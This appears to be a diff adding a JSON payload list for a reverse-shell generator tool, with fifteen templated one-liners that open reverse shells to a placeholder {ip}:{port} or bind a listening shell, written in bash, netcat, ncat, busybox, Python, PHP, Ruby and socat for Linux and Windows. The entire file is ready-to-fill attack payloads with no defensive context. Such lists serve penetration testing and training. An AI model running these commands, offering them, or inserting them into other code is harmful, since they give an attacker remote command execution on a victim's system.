@@ -1,0 +1,77 @@
+[
+    {
+        "name": "Bash -i (TCP)",
+        "command": "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+        "meta": ["linux", "bash", "ReverseShell"]
+    },
+    {
+        "name": "Bash 196",
+        "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/bash <&196 >&196 2>&196",
+        "meta": ["linux", "bash", "ReverseShell"]
+    },
+    {
+        "name": "Bash 5",
+        "command": "/bin/bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
+        "meta": ["linux", "bash", "ReverseShell"]
+    },
+    {
+        "name": "Bash udp",
+        "command": "/bin/bash -i >& /dev/udp/{ip}/{port} 0>&1",
+        "meta": ["linux", "bash", "ReverseShell"]
+    },
+    {
+        "name": "nc mkfifo",
+        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+        "meta": ["linux", "nc", "ReverseShell"]
+    },
+    {
+        "name": "nc -e",
+        "command": "nc {ip} {port} -e /bin/sh",
+        "meta": ["linux", "nc", "ReverseShell"]
+    },
+    {
+        "name": "nc.exe -e (Win)",
+        "command": "nc.exe {ip} {port} -e cmd.exe",
+        "meta": ["windows", "nc", "ReverseShell"]
+    },
+    {
+        "name": "BusyBox nc -e",
+        "command": "busybox nc {ip} {port} -e /bin/sh",
+        "meta": ["linux", "nc", "ReverseShell"]
+    },
+    {
+        "name": "ncat -e",
+        "command": "ncat {ip} {port} -e /bin/sh",
+        "meta": ["linux", "ncat", "ReverseShell"]
+    },
+    {
+        "name": "Python3 (pty)",
+        "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
+        "meta": ["linux", "python", "ReverseShell"]
+    },
+    {
+        "name": "PHP exec",
+        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "meta": ["linux", "php", "ReverseShell"]
+    },
+    {
+        "name": "Ruby #1",
+        "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
+        "meta": ["linux", "ruby", "ReverseShell"]
+    },
+    {
+        "name": "socat (TTY)",
+        "command": "socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
+        "meta": ["linux", "socat", "ReverseShell"]
+    },
+    {
+        "name": "Python3 Bind",
+        "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
+        "meta": ["bind", "python", "BindShell"]
+    },
+    {
+        "name": "nc Bind",
+        "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
+        "meta": ["bind", "nc", "BindShell"]
+    }
+]
